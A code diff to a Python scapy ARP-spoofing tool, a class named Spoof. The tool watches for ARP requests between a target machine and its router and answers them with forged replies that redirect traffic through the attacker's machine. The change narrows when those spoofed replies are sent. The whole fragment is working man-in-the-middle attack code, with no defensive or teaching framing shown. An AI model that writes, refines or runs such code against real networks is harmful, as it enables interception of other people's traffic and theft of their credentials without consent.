@@ -56,13 +56,13 @@ class Spoof:
 
         if scapy.ARP in pkt and pkt[scapy.ARP].op == 1:
 
-            if pkt.psrc == self.targetip:
+            if pkt.psrc == self.targetip and pkt.pdst == self.routerip:
                 print(self.targetip, "is asking for", self.routerip, ", sending spoofed replies...")
                 for x in range(5):
                     self.spoof(self.targetip,self.targetmac,self.routerip,self.mymac)
                     sleep(0.5)
 
-            if pkt.psrc == self.routerip:
+            if pkt.psrc == self.routerip and pkt.pdst == self.targetip:
                 print(self.routerip, "is asking for", self.targetip, ", sending spoofed replies...")
                 for x in range(5):
                     self.spoof(self.routerip,self.routermac,self.targetip,self.mymac)
